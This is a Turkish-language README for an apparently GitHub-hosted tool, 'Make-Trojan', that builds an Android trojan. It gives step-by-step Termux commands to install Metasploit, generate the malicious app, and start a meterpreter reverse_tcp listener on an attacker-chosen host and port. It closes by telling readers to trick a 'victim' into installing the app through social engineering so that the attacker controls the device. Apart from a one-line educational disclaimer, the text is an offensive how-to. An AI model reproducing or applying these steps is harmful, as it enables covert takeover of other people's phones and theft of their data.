# Make-Trojan
ÖNCELİKLE:Bu araç eğitim amaçlı hazırlandı.Aracın kullanımda meydana gelicek hiç bir şey sorumluluğumda değildir!
# Metasploit Kurulumu
1. apt update
2. apt upgrade
3. apt-get update
4. apt-get upgrade
5. apt install git
6. apt install wget
7. apt install curl
8. pkg install ruby -y
9. apt install root-depo
10. apt install unstable-repo
11. apt install x11-repo
12. pkg install metasploit -y
# Make-Trojan Kurulumu
git clone https://github.com/ByHypertext/Make-Trojan
1. pkg install python
2. cd Make-Trojan
3. python make-trojan.py
# Make-Trojan Kullanımı
Gerekli alanları doldurun ve dosyanın oluşmasını bekleyin
1. msfconsole
2. use exploit/multi/handler
3. set payload android/meterpreter/reverse_tcp
4. set LHOST (ip adresi)
5. set LPORT (port)
6. run
# Make-Trojan Çalıştırma
Cihaza bağlanmak için kurbanımıza uygulamayı sosyal mühendislik yardımıyla yükletip, bir kere tıklamasını sağlamak yeterli olacaktır. Uygulamayı silmesi durumunda cihaza olan bağlantı kesilecektir!
